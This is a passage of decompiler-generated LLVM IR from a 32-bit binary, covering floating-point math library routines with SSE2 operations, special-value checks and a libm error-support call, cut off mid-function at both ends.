  %370 = call i128 @__asm_movlpd.38(i128 %xmm3.4.reload, i64 %.reload), !insn.addr !10057
  %371 = call i128 @__asm_xorpd(i128 %xmm1.3.reload, i128 %xmm1.3.reload), !insn.addr !10058
  %372 = call i128 @__asm_andpd(i128 %370, i128 %xmm2.4.reload), !insn.addr !10059
  %373 = call i128 @__asm_pcmpeqd(i128 %371, i128 %372), !insn.addr !10060
  %374 = call i32 @__asm_pmovmskb(i128 %373), !insn.addr !10061
  %375 = and i32 %374, 255, !insn.addr !10062
  %376 = icmp eq i32 %375, 255, !insn.addr !10063
  %377 = icmp eq i1 %376, false, !insn.addr !10064
  br i1 %377, label %dec_label_pc_100234a6, label %dec_label_pc_10023451, !insn.addr !10064

dec_label_pc_10023451:                            ; preds = %dec_label_pc_1002342d
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %xmm4.5.reload = load i128, i128* %xmm4.5.reg2mem
  %378 = call i32 @__asm_pextrw(i128 %xmm2.4.reload, i32 3), !insn.addr !10065
  %379 = call i128 @__asm_movlpd.38(i128 %xmm4.5.reload, i64 %arg1), !insn.addr !10066
  %380 = xor i32 %ecx.4.reload, -1074790400, !insn.addr !10067
  %381 = or i32 %edx.1.reload, %380, !insn.addr !10068
  %382 = icmp eq i32 %381, 0, !insn.addr !10069
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10070
  br i1 %382, label %dec_label_pc_100232b5, label %dec_label_pc_10023472, !insn.addr !10070

dec_label_pc_10023472:                            ; preds = %dec_label_pc_10023451
  %383 = trunc i32 %378 to i16
  %384 = icmp sgt i16 %383, -1, !insn.addr !10071
  %385 = call i32 @__asm_pextrw(i128 %379, i32 3)
  %386 = and i32 %385, 32752
  %387 = icmp ult i32 %386, 16368
  br i1 %384, label %dec_label_pc_1002348b, label %dec_label_pc_10023477, !insn.addr !10072

dec_label_pc_10023477:                            ; preds = %dec_label_pc_10023472
  store x86_fp80 0xK00000000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10073
  br i1 %387, label %dec_label_pc_1002349f, label %dec_label_pc_100232b5, !insn.addr !10073

dec_label_pc_1002348b:                            ; preds = %dec_label_pc_10023472
  %388 = icmp eq i1 %387, false, !insn.addr !10074
  store x86_fp80 0xK00000000000000000000, x86_fp80* %merge.reg2mem, !insn.addr !10074
  br i1 %388, label %dec_label_pc_1002349f, label %dec_label_pc_100232b5, !insn.addr !10074

dec_label_pc_1002349f:                            ; preds = %dec_label_pc_1002348b, %dec_label_pc_10023477, %dec_label_pc_10023383, %dec_label_pc_10023367
  store x86_fp80 0xK7FFF8000000000000000, x86_fp80* %merge.reg2mem
  br label %dec_label_pc_100232b5

dec_label_pc_100234a6:                            ; preds = %dec_label_pc_1002342d
  %xmm0.3.reload = load i128, i128* %xmm0.3.reg2mem
  %389 = call i128 @__asm_addsd(i128 %xmm2.4.reload, i128 %xmm2.4.reload), !insn.addr !10075
  %390 = call i128 @__asm_movsd(i128 %xmm0.3.reload, i128 %389), !insn.addr !10076
  store i128 %390, i128* %xmm0.4.reg2mem, !insn.addr !10077
  store i32 1006, i32* %edx.2.reg2mem, !insn.addr !10077
  br label %dec_label_pc_1002350e, !insn.addr !10077

dec_label_pc_100234b5:                            ; preds = %dec_label_pc_100230b6
  %391 = call i32 @__asm_movd.36(i128 %14), !insn.addr !10078
  %392 = call i128 @__asm_psrlq(i128 %14, i32 32), !insn.addr !10079
  %393 = call i32 @__asm_movd.36(i128 %392), !insn.addr !10080
  %394 = and i32 %393, 2147483647, !insn.addr !10081
  %395 = or i32 %394, %391, !insn.addr !10082
  %396 = call i128 @__asm_movlpd.38(i128 %15, i64 %11), !insn.addr !10083
  %397 = icmp eq i32 %395, 0, !insn.addr !10084
  store i128 %396, i128* %xmm0.4.reg2mem, !insn.addr !10085
  store i32 26, i32* %edx.2.reg2mem, !insn.addr !10085
  br i1 %397, label %dec_label_pc_1002350e, label %dec_label_pc_100234de, !insn.addr !10085

dec_label_pc_100234de:                            ; preds = %dec_label_pc_100234b5
  %398 = call i32 @__asm_movd.36(i128 %392), !insn.addr !10086
  %399 = and i32 %398, 2147483647, !insn.addr !10087
  %400 = icmp ult i32 %399, 2146435073
  store i128 %396, i128* %xmm0.4.reg2mem, !insn.addr !10088
  store i32 29, i32* %edx.2.reg2mem, !insn.addr !10088
  br i1 %400, label %dec_label_pc_100234f3, label %dec_label_pc_1002350e, !insn.addr !10088

dec_label_pc_100234f3:                            ; preds = %dec_label_pc_100234de
  %401 = icmp ne i32 %399, 2146435072, !insn.addr !10089
  %402 = icmp eq i32 %391, 0, !insn.addr !10090
  %or.cond5 = or i1 %402, %401
  store i128 %396, i128* %xmm0.4.reg2mem, !insn.addr !10091
  store i32 29, i32* %edx.2.reg2mem, !insn.addr !10091
  br i1 %or.cond5, label %dec_label_pc_100234fa, label %dec_label_pc_1002350e, !insn.addr !10091

dec_label_pc_100234fa:                            ; preds = %dec_label_pc_100234f3
  %403 = bitcast double %7 to i64, !insn.addr !10092
  call void @__asm_movlpd(i64 %403, i128 %396), !insn.addr !10092
  %404 = fpext double %7 to x86_fp80, !insn.addr !10093
  ret x86_fp80 %404, !insn.addr !10094

dec_label_pc_1002350e.fold.split:                 ; preds = %dec_label_pc_100236cf
  store i128 %511, i128* %xmm0.4.reg2mem
  store i32 25, i32* %edx.2.reg2mem
  store i32 %506, i32* %esp.0.reg2mem
  br label %dec_label_pc_1002350e

dec_label_pc_1002350e.fold.split8:                ; preds = %dec_label_pc_1002371d
  store i128 %519, i128* %xmm0.4.reg2mem
  store i32 25, i32* %edx.2.reg2mem
  store i32 %506, i32* %esp.0.reg2mem
  br label %dec_label_pc_1002350e

dec_label_pc_1002350e:                            ; preds = %dec_label_pc_1002371d, %dec_label_pc_1002350e.fold.split8, %dec_label_pc_100236cf, %dec_label_pc_1002350e.fold.split, %dec_label_pc_100234f3, %dec_label_pc_100234de, %dec_label_pc_100237a9, %dec_label_pc_10023794, %dec_label_pc_10023767, %dec_label_pc_100234b5, %dec_label_pc_100234a6, %dec_label_pc_100233da, %dec_label_pc_1002339f, %dec_label_pc_10023276
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %xmm0.4.reload = load i128, i128* %xmm0.4.reg2mem
  %405 = add i32 %esp.0.reload, -28, !insn.addr !10095
  %406 = add i32 %esp.0.reload, -12, !insn.addr !10096
  %407 = inttoptr i32 %406 to i64*, !insn.addr !10096
  %408 = load i64, i64* %407, align 4, !insn.addr !10096
  call void @__asm_movlpd(i64 %408, i128 %xmm0.4.reload), !insn.addr !10096
  %409 = add i32 %esp.0.reload, -16, !insn.addr !10097
  %410 = inttoptr i32 %409 to i32*, !insn.addr !10097
  store i32 %edx.2.reload, i32* %410, align 4, !insn.addr !10097
  %411 = add i32 %esp.0.reload, -20, !insn.addr !10098
  %412 = inttoptr i32 %411 to i32*, !insn.addr !10098
  store i32 %406, i32* %412, align 4, !insn.addr !10098
  %413 = add i32 %esp.0.reload, 12, !insn.addr !10099
  %414 = add i32 %esp.0.reload, -24, !insn.addr !10100
  %415 = inttoptr i32 %414 to i32*, !insn.addr !10100
  store i32 %413, i32* %415, align 4, !insn.addr !10100
  %416 = add i32 %esp.0.reload, 4, !insn.addr !10101
  %417 = inttoptr i32 %405 to i32*, !insn.addr !10102
  store i32 %416, i32* %417, align 4, !insn.addr !10102
  %418 = call i32 @___libm_error_support(), !insn.addr !10103
  %419 = inttoptr i32 %406 to double*, !insn.addr !10104
  %420 = load double, double* %419, align 4, !insn.addr !10104
  %421 = fpext double %420 to x86_fp80, !insn.addr !10104
  ret x86_fp80 %421, !insn.addr !10105

dec_label_pc_1002353e:                            ; preds = %dec_label_pc_10022f08
  %422 = icmp slt i32 %141, 1, !insn.addr !10106
  br i1 %422, label %dec_label_pc_1002356b, label %dec_label_pc_10023543, !insn.addr !10106

dec_label_pc_10023543:                            ; preds = %dec_label_pc_1002353e
  %423 = icmp ult i32 %141, 262144, !insn.addr !10107
  %424 = icmp eq i1 %423, false, !insn.addr !10108
  store i128 %129, i128* %xmm0.6.reg2mem, !insn.addr !10108
  br i1 %424, label %dec_label_pc_1002378a, label %dec_label_pc_1002354e, !insn.addr !10108

dec_label_pc_1002354e:                            ; preds = %dec_label_pc_10023543
  %425 = add nsw i32 %ecx.0.reload, 261888, !insn.addr !10109
  %426 = add i32 %141, -128, !insn.addr !10110
  store i32 %425, i32* %ecx.5.reg2mem, !insn.addr !10111
  store i32 %426, i32* %storemerge2.in.reg2mem, !insn.addr !10111
  store i32 16368, i32* %storemerge.reg2mem, !insn.addr !10111
  br label %dec_label_pc_10023591, !insn.addr !10111

dec_label_pc_1002356b:                            ; preds = %dec_label_pc_1002353e
  %427 = icmp slt i32 %141, -261631, !insn.addr !10112
  store i128 %129, i128* %xmm0.5.reg2mem, !insn.addr !10112
  br i1 %427, label %dec_label_pc_10023767, label %dec_label_pc_10023576, !insn.addr !10112

dec_label_pc_10023576:                            ; preds = %dec_label_pc_1002356b
  %428 = add nsw i32 %ecx.0.reload, 128, !insn.addr !10113
  %429 = add i32 %141, 261760
  store i32 %428, i32* %ecx.5.reg2mem, !insn.addr !10114
  store i32 %429, i32* %storemerge2.in.reg2mem, !insn.addr !10114
  store i32 0, i32* %storemerge.reg2mem, !insn.addr !10114
  br label %dec_label_pc_10023591, !insn.addr !10114

dec_label_pc_10023591:                            ; preds = %dec_label_pc_10023576, %dec_label_pc_1002354e
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %storemerge2.in.reload = load i32, i32* %storemerge2.in.reg2mem
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %storemerge2 = and i32 %storemerge2.in.reload, -128
  %430 = call i128 @__asm_addsd(i128 %146, i128 %129), !insn.addr !10115
  %431 = call i128 @__asm_movsd(i128 %129, i128 %136), !insn.addr !10116
  %432 = call i128 @__asm_addsd.40(i128 %136, i64 4843621399236968448), !insn.addr !10117
  %433 = add i32 %storemerge2, -130944, !insn.addr !10118
  %434 = call i128 @__asm_mulpd(i128 %139, i128 %112), !insn.addr !10119
  %435 = call i128 @__asm_subsd.41(i128 %432, i64 4843621399236968448), !insn.addr !10120
  %436 = call i128 @__asm_mulpd(i128 %112, i128 %112), !insn.addr !10121
  %437 = call i128 @__asm_subsd(i128 %431, i128 %435), !insn.addr !10122
  %eax.1 = mul i32 %141, 16
  %438 = and i32 %eax.1, 2032, !insn.addr !10123
  %439 = add i32 %438, ptrtoint (i128** @global_var_10037fc0 to i32), !insn.addr !10124
  %440 = inttoptr i32 %439 to i128*, !insn.addr !10124
  %441 = load i128, i128* %440, align 4, !insn.addr !10124
  %442 = call i128 @__asm_movapd(i128 %441), !insn.addr !10124
  %443 = load i128, i128* @global_var_100331a0, align 4, !insn.addr !10125
  %444 = call i128 @__asm_movapd(i128 %443), !insn.addr !10125
  %445 = call i128 @__asm_mulpd(i128 %144, i128 %436), !insn.addr !10126
  %446 = call i128 @__asm_addpd(i128 %434, i128 %445), !insn.addr !10127
  %447 = call i128 @__asm_pshufd(i128 %446, i32 238), !insn.addr !10128
  %448 = call i128 @__asm_mulsd(i128 %446, i128 %436), !insn.addr !10129
  %449 = call i128 @__asm_addsd(i128 %448, i128 %447), !insn.addr !10130
  %450 = call i128 @__asm_addsd(i128 %449, i128 %430), !insn.addr !10131
  %451 = call i128 @__asm_movlpd.38(i128 %430, i64 4604418534313441775), !insn.addr !10132
  %452 = call i128 @__asm_movd(i32 %storemerge2), !insn.addr !10133
  %453 = sub i32 130944, %storemerge2, !insn.addr !10134
  %454 = sdiv i32 %453, 128, !insn.addr !10135
  %455 = add nsw i32 %454, 2, !insn.addr !10136
  %456 = and i32 %455, 32, !insn.addr !10137
  %457 = add nsw i32 %456, %455, !insn.addr !10138
  %458 = call i128 @__asm_xorpd(i128 %436, i128 %436), !insn.addr !10139
  %459 = call i128 @__asm_pinsrw(i128 %458, i32 16256, i32 3), !insn.addr !10140
  %460 = call i128 @__asm_mulsd.39(i128 %450, i64 %arg2), !insn.addr !10141
  %461 = call i128 @__asm_mulsd(i128 %437, i128 %459), !insn.addr !10142
  %462 = call i128 @__asm_psllq.42(i128 %452, i32 45), !insn.addr !10143
  %463 = call i128 @__asm_pshufd(i128 %462, i32 68), !insn.addr !10144
  %464 = load i128, i128* @global_var_100331b0, align 4, !insn.addr !10145
  %465 = call i128 @__asm_movapd(i128 %464), !insn.addr !10145
  %466 = call i128 @__asm_addsd(i128 %147, i128 %460), !insn.addr !10146
  %467 = call i128 @__asm_mulpd(i128 %442, i128 %463), !insn.addr !10147
  %468 = call i128 @__asm_addsd(i128 %461, i128 %466), !insn.addr !10148
  %469 = call i128 @__asm_unpcklpd(i128 %468, i128 %468), !insn.addr !10149
  %470 = call i128 @__asm_mulpd(i128 %444, i128 %469), !insn.addr !10150
  %471 = call i128 @__asm_mulsd(i128 %451, i128 %469), !insn.addr !10151
  %472 = call i128 @__asm_mulpd(i128 %469, i128 %469), !insn.addr !10152
  %473 = call i128 @__asm_addpd(i128 %465, i128 %470), !insn.addr !10153
  %474 = call i128 @__asm_mulpd(i128 %473, i128 %472), !insn.addr !10154
  %475 = call i128 @__asm_mulsd(i128 %472, i128 %467), !insn.addr !10155
  %476 = call i128 @__asm_pshufd(i128 %474, i32 238), !insn.addr !10156
  %477 = call i128 @__asm_mulsd(i128 %475, i128 %474), !insn.addr !10157
  %478 = call i128 @__asm_pshufd(i128 %467, i32 238), !insn.addr !10158
  %479 = call i128 @__asm_mulsd(i128 %476, i128 %467), !insn.addr !10159
  %480 = call i128 @__asm_mulsd(i128 %471, i128 %467), !insn.addr !10160
  %481 = call i128 @__asm_movd(i32 %ecx.5.reload), !insn.addr !10161
  %482 = call i128 @__asm_psllq.42(i128 %481, i32 45), !insn.addr !10162
  %483 = call i128 @__asm_movd(i32 %457), !insn.addr !10163
  %484 = call i128 @__asm_pcmpeqd(i128 %463, i128 %463), !insn.addr !10164
  %485 = call i128 @__asm_psllq(i128 %484, i128 %483), !insn.addr !10165
  %486 = call i128 @__asm_addsd(i128 %477, i128 %478), !insn.addr !10166
  %487 = call i128 @__asm_addsd(i128 %486, i128 %479), !insn.addr !10167
  %488 = call i128 @__asm_andpd(i128 %485, i128 %467), !insn.addr !10168
  %489 = call i128 @__asm_addsd(i128 %487, i128 %480), !insn.addr !10169
  %490 = call i128 @__asm_xorpd(i128 %479, i128 %479), !insn.addr !10170
  %491 = call i128 @__asm_pcmpeqd(i128 %480, i128 %480), !insn.addr !10171
  %492 = call i128 @__asm_psllq(i128 %491, i128 %483), !insn.addr !10172
  %493 = call i128 @__asm_subsd(i128 %467, i128 %488), !insn.addr !10173
  %494 = call i128 @__asm_movsd(i128 %483, i128 %488), !insn.addr !10174
  %495 = call i128 @__asm_addsd(i128 %488, i128 %489), !insn.addr !10175
  %496 = call i128 @__asm_andpd(i128 %495, i128 %492), !insn.addr !10176
  %497 = call i128 @__asm_pinsrw(i128 %490, i32 %storemerge.reload, i32 3), !insn.addr !10177
  %498 = call i128 @__asm_subsd(i128 %494, i128 %496), !insn.addr !10178
  %499 = call i128 @__asm_addsd(i128 %489, i128 %498), !insn.addr !10179
  %500 = call i128 @__asm_addsd(i128 %499, i128 %493), !insn.addr !10180
  %501 = icmp eq i32 %433, 0, !insn.addr !10181
  %502 = icmp slt i32 %433, 0, !insn.addr !10181
  %503 = icmp eq i1 %502, false, !insn.addr !10182
  %504 = icmp eq i1 %501, false, !insn.addr !10182
  %505 = icmp eq i1 %503, %504, !insn.addr !10182
  %506 = ptrtoint i32* %stack_var_0 to i32
  br i1 %505, label %dec_label_pc_1002371d, label %dec_label_pc_100236cf, !insn.addr !10182

dec_label_pc_100236cf:                            ; preds = %dec_label_pc_10023591
  %507 = call i128 @__asm_mulsd(i128 %500, i128 %482), !insn.addr !10183
  %508 = call i128 @__asm_mulsd(i128 %496, i128 %482), !insn.addr !10184
  %509 = call i128 @__asm_addsd(i128 %507, i128 %508), !insn.addr !10185
  %510 = call i128 @__asm_mulsd(i128 %497, i128 %509), !insn.addr !10186
  %511 = call i128 @__asm_addsd(i128 %509, i128 %510), !insn.addr !10187
  %512 = call i32 @__asm_pextrw(i128 %511, i32 3), !insn.addr !10188
  %513 = and i32 %512, 32752, !insn.addr !10189
  store i128 %511, i128* %xmm0.4.reg2mem
  store i32 24, i32* %edx.2.reg2mem
  store i32 %506, i32* %esp.0.reg2mem
  switch i32 %513, label %dec_label_pc_1002370c [
    i32 32752, label %dec_label_pc_1002350e
    i32 0, label %dec_label_pc_1002350e.fold.split
  ]

dec_label_pc_1002370c:                            ; preds = %dec_label_pc_100236cf
  %514 = bitcast double %7 to i64, !insn.addr !10190
  call void @__asm_movlpd(i64 %514, i128 %511), !insn.addr !10190
  %515 = fpext double %7 to x86_fp80, !insn.addr !10191
  ret x86_fp80 %515, !insn.addr !10192

dec_label_pc_1002371d:                            ; preds = %dec_label_pc_10023591
  %516 = call i128 @__asm_addsd(i128 %500, i128 %496), !insn.addr !10193
  %517 = call i128 @__asm_mulsd(i128 %516, i128 %482), !insn.addr !10194
  %518 = call i128 @__asm_mulsd(i128 %497, i128 %517), !insn.addr !10195
  %519 = call i128 @__asm_addsd(i128 %517, i128 %518), !insn.addr !10196
  %520 = call i32 @__asm_pextrw(i128 %519, i32 3), !insn.addr !10197
  %521 = and i32 %520, 32752, !insn.addr !10198
  store i128 %519, i128* %xmm0.4.reg2mem
  store i32 24, i32* %edx.2.reg2mem
  store i32 %506, i32* %esp.0.reg2mem
  switch i32 %521, label %dec_label_pc_10023756 [
    i32 32752, label %dec_label_pc_1002350e
    i32 0, label %dec_label_pc_1002350e.fold.split8
  ]

dec_label_pc_10023756:                            ; preds = %dec_label_pc_1002371d
  %522 = bitcast double %7 to i64, !insn.addr !10199
  call void @__asm_movlpd(i64 %522, i128 %519), !insn.addr !10199
  %523 = fpext double %7 to x86_fp80, !insn.addr !10200
  ret x86_fp80 %523, !insn.addr !10201

dec_label_pc_10023767:                            ; preds = %dec_label_pc_1002380e, %dec_label_pc_1002356b
  %xmm0.5.reload = load i128, i128* %xmm0.5.reg2mem
  %524 = call i128 @__asm_movlpd.38(i128 %xmm0.5.reload, i64 4503599627370496), !insn.addr !10202
  %525 = call i128 @__asm_movd(i32 %ecx.0.reload), !insn.addr !10203
  %526 = call i128 @__asm_mulsd(i128 %524, i128 %524), !insn.addr !10204
  %527 = call i128 @__asm_psllq.42(i128 %525, i32 45), !insn.addr !10205
  %528 = call i128 @__asm_orpd(i128 %526, i128 %527), !insn.addr !10206
  store i128 %528, i128* %xmm0.4.reg2mem, !insn.addr !10207
  store i32 25, i32* %edx.2.reg2mem, !insn.addr !10207
  br label %dec_label_pc_1002350e, !insn.addr !10207

dec_label_pc_1002378a:                            ; preds = %dec_label_pc_1002380e, %dec_label_pc_10023543
  %xmm0.6.reload = load i128, i128* %xmm0.6.reg2mem
  %529 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !10208
  br i1 %529, label %dec_label_pc_100237a9, label %dec_label_pc_10023794, !insn.addr !10209

dec_label_pc_10023794:                            ; preds = %dec_label_pc_1002378a
  %530 = call i128 @__asm_movlpd.38(i128 %xmm0.6.reload, i64 -9007199254740992), !insn.addr !10210
  %531 = call i128 @__asm_mulsd.39(i128 %530, i64 9214364837600034816), !insn.addr !10211
  store i128 %531, i128* %xmm0.4.reg2mem, !insn.addr !10212
  store i32 24, i32* %edx.2.reg2mem, !insn.addr !10212
  br label %dec_label_pc_1002350e, !insn.addr !10212

dec_label_pc_100237a9:                            ; preds = %dec_label_pc_1002378a
  %532 = call i128 @__asm_movlpd.38(i128 %xmm0.6.reload, i64 9214364837600034816), !insn.addr !10213
  %533 = call i128 @__asm_mulsd(i128 %532, i128 %532), !insn.addr !10214
  store i128 %533, i128* %xmm0.4.reg2mem, !insn.addr !10215
  store i32 24, i32* %edx.2.reg2mem, !insn.addr !10215
  br label %dec_label_pc_1002350e, !insn.addr !10215

dec_label_pc_100237ba:                            ; preds = %dec_label_pc_10022ee1
  %534 = call i128 @__asm_pshufd(i128 %101, i32 68), !insn.addr !10216
  %535 = call i128 @__asm_mulpd(i128 %534, i128 %111), !insn.addr !10217
  %536 = call i32 @__asm_pextrw(i128 %535, i32 3), !insn.addr !10218
  %537 = and i32 %536, 32752, !insn.addr !10219
  %538 = sub nsw i32 16544, %537, !insn.addr !10220
  %539 = add nsw i32 %537, -15472, !insn.addr !10221
  %540 = or i32 %538, %539, !insn.addr !10222
  %541 = icmp sgt i32 %540, -1, !insn.addr !10223
  store i128 %535, i128* %xmm4.1.reg2mem, !insn.addr !10224
  br i1 %541, label %dec_label_pc_10022f08, label %dec_label_pc_100237e7, !insn.addr !10224

dec_label_pc_100237e7:                            ; preds = %dec_label_pc_100237ba
  %542 = icmp sgt i32 %539, -1, !insn.addr !10225
  br i1 %542, label %dec_label_pc_1002380e, label %dec_label_pc_100237ee, !insn.addr !10226

dec_label_pc_100237ee:                            ; preds = %dec_label_pc_100237e7
  %543 = or i32 %ecx.0.reload, 130944, !insn.addr !10227
  %544 = call i128 @__asm_movd(i32 %543), !insn.addr !10228
  %545 = call i128 @__asm_psllq.42(i128 %544, i32 45), !insn.addr !10229
  %546 = bitcast double %7 to i64, !insn.addr !10230
  call void @__asm_movlpd(i64 %546, i128 %545), !insn.addr !10230
  %547 = fpext double %7 to x86_fp80, !insn.addr !10231
  ret x86_fp80 %547, !insn.addr !10232

dec_label_pc_1002380e:                            ; preds = %dec_label_pc_100237e7
  %548 = call i128 @__asm_movlpd.38(i128 %535, i64 %arg1), !insn.addr !10233
  %549 = call i32 @__asm_pextrw(i128 %548, i32 3), !insn.addr !10234
  %550 = and i32 %549, 32752, !insn.addr !10235
  %551 = add nuw nsw i32 %550, 49168, !insn.addr !10236
  %552 = call i32 @__asm_pextrw(i128 %101, i32 3), !insn.addr !10237
  %553 = xor i32 %551, %552, !insn.addr !10238
  %554 = trunc i32 %553 to i16
  %555 = icmp sgt i16 %554, -1, !insn.addr !10239
  %556 = icmp eq i1 %555, false, !insn.addr !10240
  store i128 %109, i128* %xmm0.5.reg2mem, !insn.addr !10240
  store i128 %109, i128* %xmm0.6.reg2mem, !insn.addr !10240
  br i1 %556, label %dec_label_pc_10023767, label %dec_label_pc_1002378a, !insn.addr !10240
}

define i32 @function_10023840() local_unnamed_addr {
dec_label_pc_10023840:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %0, -144, !insn.addr !10241
  %3 = inttoptr i32 %2 to i8*, !insn.addr !10241
  store i8 -2, i8* %3, align 1, !insn.addr !10241
  %4 = and i32 %1, 65280
  %5 = icmp eq i32 %4, 0, !insn.addr !10242
  %6 = icmp eq i1 %5, false, !insn.addr !10243
  br i1 %6, label %dec_label_pc_10023886, label %dec_label_pc_1002385e, !insn.addr !10243

dec_label_pc_1002385e:                            ; preds = %dec_label_pc_10023886, %dec_label_pc_10023840
  %7 = call x86_fp80 @function_1002398e(), !insn.addr !10244
  %8 = call x86_fp80 @function_10023b38(), !insn.addr !10245
  %9 = fptrunc x86_fp80 %8 to float, !insn.addr !10245
  %10 = bitcast float %9 to i32, !insn.addr !10245
  ret i32 %10, !insn.addr !10245

dec_label_pc_10023886:                            ; preds = %dec_label_pc_10023840
  %11 = call i32 @function_100239d1(), !insn.addr !10246
  %cond = icmp eq i32 %11, 0
  br i1 %cond, label %dec_label_pc_100238a3, label %dec_label_pc_1002385e

dec_label_pc_100238a3:                            ; preds = %dec_label_pc_10023886
  %12 = call i32 @function_10023bf3(), !insn.addr !10247
  ret i32 %12, !insn.addr !10247
}

define x86_fp80 @function_100238a8() local_unnamed_addr {
dec_label_pc_100238a8:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -144, !insn.addr !10248
  %2 = inttoptr i32 %1 to i8*, !insn.addr !10248
  store i8 2, i8* %2, align 1, !insn.addr !10248
  ret x86_fp80 0xK7FFF8000000000000000, !insn.addr !10249
}

define x86_fp80 @function_100238ba() local_unnamed_addr {
dec_label_pc_100238ba:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__asm_wait(), !insn.addr !10250
  %2 = add i32 %0, -160, !insn.addr !10251
  %3 = inttoptr i32 %2 to i32*, !insn.addr !10251
  %4 = call i32 @__asm_wait(), !insn.addr !10252
  %5 = call x86_fp80 @llvm.log2.f80(x86_fp80 0xK3FFEB17217F7D1CF7800), !insn.addr !10253
  %6 = fmul x86_fp80 %5, 0xK3FFEB17217F7D1CF7800, !insn.addr !10253
  ret x86_fp80 %6, !insn.addr !10254
}

define x86_fp80 @function_100238d4() local_unnamed_addr {
dec_label_pc_100238d4:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -144, !insn.addr !10255
  %2 = inttoptr i32 %1 to i8*, !insn.addr !10255
  store i8 2, i8* %2, align 1, !insn.addr !10255
  ret x86_fp80 0xKFFFF8000000000000000, !insn.addr !10256
}

define i32 @function_100238e4() local_unnamed_addr {
dec_label_pc_100238e4:
  %0 = call i32 @__decompiler_undefined_function_1()
  ret i32 %0, !insn.addr !10257
}

define i32 @function_10023940(i32 %arg1) local_unnamed_addr {
dec_label_pc_10023940:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__asm_wait(), !insn.addr !10258
  %2 = call i32 @__asm_wait(), !insn.addr !10259
  %3 = add i32 %0, -159, !insn.addr !10260
  %4 = inttoptr i32 %3 to i8*, !insn.addr !10260
  %5 = load i8, i8* %4, align 1, !insn.addr !10260
  %6 = and i8 %5, 1, !insn.addr !10260
  %7 = icmp eq i8 %6, 0, !insn.addr !10260
  %8 = icmp eq i1 %7, false, !insn.addr !10261
  br i1 %8, label %dec_label_pc_10023963, label %dec_label_pc_10023954, !insn.addr !10261

dec_label_pc_10023954:                            ; preds = %dec_label_pc_10023940
  ret i32 %2, !insn.addr !10262

dec_label_pc_10023963:                            ; preds = %dec_label_pc_10023940
  %9 = add i32 %0, -160, !insn.addr !10263
  %10 = inttoptr i32 %9 to i32*, !insn.addr !10263
  %11 = add i32 %0, -144, !insn.addr !10264
  %12 = inttoptr i32 %11 to i8*, !insn.addr !10264
  store i8 4, i8* %12, align 1, !insn.addr !10264
  %13 = call x86_fp80 @function_10023b46(), !insn.addr !10265
  %14 = fptrunc x86_fp80 %13 to float, !insn.addr !10265
  %15 = bitcast float %14 to i32, !insn.addr !10265
  ret i32 %15, !insn.addr !10265
}

define x86_fp80 @function_1002396f() local_unnamed_addr {
dec_label_pc_1002396f:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -144, !insn.addr !10266
  %2 = inttoptr i32 %1 to i8*, !insn.addr !10266
  store i8 3, i8* %2, align 1, !insn.addr !10266
  ret x86_fp80 0xK7FFF8000000000000000, !insn.addr !10267
}

define x86_fp80 @function_10023981() local_unnamed_addr {
dec_label_pc_10023981:
  ret x86_fp80 0xK7FFF8000000000000000, !insn.addr !10268
}

define x86_fp80 @function_1002398e() local_unnamed_addr {
dec_label_pc_1002398e:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call x86_fp80 @__decompiler_undefined_function_19()
  %2 = call i32 @__asm_wait(), !insn.addr !10269
  %3 = call i32 @__asm_wait(), !insn.addr !10270
  %4 = add i32 %0, -159, !insn.addr !10271
  %5 = inttoptr i32 %4 to i8*, !insn.addr !10271
  %6 = load i8, i8* %5, align 1, !insn.addr !10271
  %7 = and i8 %6, 65, !insn.addr !10271
  %8 = icmp eq i8 %7, 0, !insn.addr !10271
  %9 = icmp eq i1 %8, false, !insn.addr !10272
  br i1 %9, label %10, label %dec_label_pc_100239ab, !insn.addr !10272

; <label>:10:                                     ; preds = %dec_label_pc_1002398e
  %11 = add i32 %0, -160, !insn.addr !10273
  %12 = inttoptr i32 %11 to i32*, !insn.addr !10273
  %13 = call i32 @function_10023940(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10272
  br label %dec_label_pc_100239ab, !insn.addr !10272

dec_label_pc_100239ab:                            ; preds = %10, %dec_label_pc_1002398e
  %14 = call x86_fp80 @llvm.fabs.f80(x86_fp80 %1), !insn.addr !10274
  %15 = call x86_fp80 @llvm.round.f80(x86_fp80 %14), !insn.addr !10275
  %16 = call i32 @__asm_wait(), !insn.addr !10276
  %17 = call i32 @__asm_wait(), !insn.addr !10277
  %18 = fsub x86_fp80 %15, %15, !insn.addr !10278
  %19 = call i32 @__asm_wait(), !insn.addr !10279
  %20 = call x86_fp80 @llvm.fabs.f80(x86_fp80 %18), !insn.addr !10280
  %21 = fadd x86_fp80 %20, 0xKBFFF8000000000000000, !insn.addr !10281
  %22 = call x86_fp80 @llvm.exp2.f80(x86_fp80 %21), !insn.addr !10281
  ret x86_fp80 %22, !insn.addr !10282
}

define i32 @function_100239d1() local_unnamed_addr {
dec_label_pc_100239d1:
  %eax.0.reg2mem = alloca i32, !insn.addr !10283
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__asm_wait(), !insn.addr !10284
  %2 = and i32 %0, 16384
  %3 = icmp ne i32 %2, 0, !insn.addr !10285
  %4 = icmp eq i1 %3, false, !insn.addr !10286
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !10286
  br i1 %4, label %dec_label_pc_100239f6, label %dec_label_pc_100239dd, !insn.addr !10286

dec_label_pc_100239dd:                            ; preds = %dec_label_pc_100239d1
  %5 = call i32 @__asm_wait(), !insn.addr !10287
  %6 = icmp eq i32 %2, 0, !insn.addr !10288
